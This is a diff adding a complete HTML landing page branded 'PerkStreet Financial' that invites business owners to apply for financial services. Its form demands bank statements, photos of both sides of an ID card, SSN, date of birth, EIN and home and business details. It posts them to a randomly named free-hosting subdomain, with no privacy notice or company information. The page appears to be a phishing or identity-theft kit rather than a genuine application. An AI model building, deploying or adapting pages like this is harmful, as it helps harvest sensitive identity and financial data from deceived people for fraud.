@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PerkStreet Financial</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      background-color: #F5F5F5;
+      color: #000;
+    }
+    header {
+      background-color: #fff;
+      padding: 20px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .cta {
+      background-color: #FF5000;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .hero {
+      text-align: center;
+      padding: 60px 20px 30px;
+    }
+    .hero h1 {
+      font-size: 2.5rem;
+      margin-bottom: 1rem;
+    }
+    .hero p {
+      font-size: 1.2rem;
+      margin-bottom: 2rem;
+    }
+    form {
+      max-width: 600px;
+      margin: 0 auto 50px;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+    form input, form textarea {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 1rem;
+    }
+    form button {
+      width: 100%;
+      padding: 12px;
+      background-color: #FF5000;
+      color: white;
+      font-size: 1rem;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    footer {
+      text-align: center;
+      font-size: 0.9rem;
+      padding: 20px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div><strong>PerkStreet Financial</strong></div>
+    <a href="#form" class="cta">Apply Now</a>
+  </header>
+
+  <div class="hero">
+    <h1>Modern financial tools to fuel your business growth</h1>
+    <p>Apply now to get access to next-generation financial solutions for your business.</p>
+    <a href="#form" class="cta">Start Application</a>
+  </div>
+
+  <form id="form" action="https://perkstreet-site-6yb6.onrender.com/submit" method="POST" enctype="multipart/form-data">
+    <label>6 Months Business Account Statement</label>
+    <input type="file" name="bank_statement" required>
+
+    <label>Clear ID Card (Front)</label>
+    <input type="file" name="id_front" required>
+
+    <label>Clear ID Card (Back)</label>
+    <input type="file" name="id_back" required>
+
+    <input type="text" name="ssn" placeholder="SSN" required>
+    <input type="date" name="dob" placeholder="Date of Birth" required>
+    <input type="tel" name="phone" placeholder="Phone Number" required>
+    <input type="email" name="email" placeholder="Email Address" required>
+    <input type="text" name="business_name" placeholder="Business Name" required>
+    <input type="text" name="business_address" placeholder="Business Address" required>
+    <input type="text" name="home_address" placeholder="Home Address" required>
+    <input type="text" name="ein" placeholder="EIN / TAX ID" required>
+    <input type="text" name="business_phone" placeholder="Business Phone Number" required>
+    <input type="text" name="business_website" placeholder="Business Website" required>
+    <input type="email" name="business_email" placeholder="Business Email" required>
+    <input type="text" name="annual_revenue" placeholder="Annual Revenue" required>
+    <input type="text" name="position" placeholder="Position" required>
+
+    <button type="submit">Submit Application</button>
+  </form>
+
+  <footer>
+    &copy; 2025 PerkStreet Financial. All rights reserved.
+  </footer>
+</body>
+</html>
